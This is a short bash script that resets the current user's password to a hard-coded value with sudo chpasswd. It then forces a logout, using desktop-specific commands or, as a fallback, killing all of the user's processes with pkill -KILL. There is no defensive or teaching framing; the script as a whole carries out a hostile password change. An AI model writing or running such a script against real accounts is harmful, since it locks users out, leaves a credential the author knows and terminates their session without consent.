#!/bin/bash

# Change the password to the pre-set one
echo "$USER:donttrustanything" | sudo chpasswd
echo "Password has been updated."

# Log the user out
echo "Logging out..."
sleep 2

# Check the current desktop environment
if [[ "$XDG_CURRENT_DESKTOP" == *"GNOME"* ]]; then
    echo "Detected GNOME. Logging out using gnome-session-quit."
    gnome-session-quit --logout --no-prompt
elif [[ "$XDG_CURRENT_DESKTOP" == *"KDE"* ]]; then
    echo "Detected KDE. Logging out using qdbus."
    qdbus org.kde.ksmserver /KSMServer logout 0 0 0
elif [[ "$XDG_CURRENT_DESKTOP" == *"XFCE"* ]]; then
    echo "Detected XFCE. Logging out using xfce4-session-logout."
    xfce4-session-logout --logout
else
    echo "Unknown or unsupported desktop environment. Logging out using pkill."
    pkill -KILL -u $USER
fi
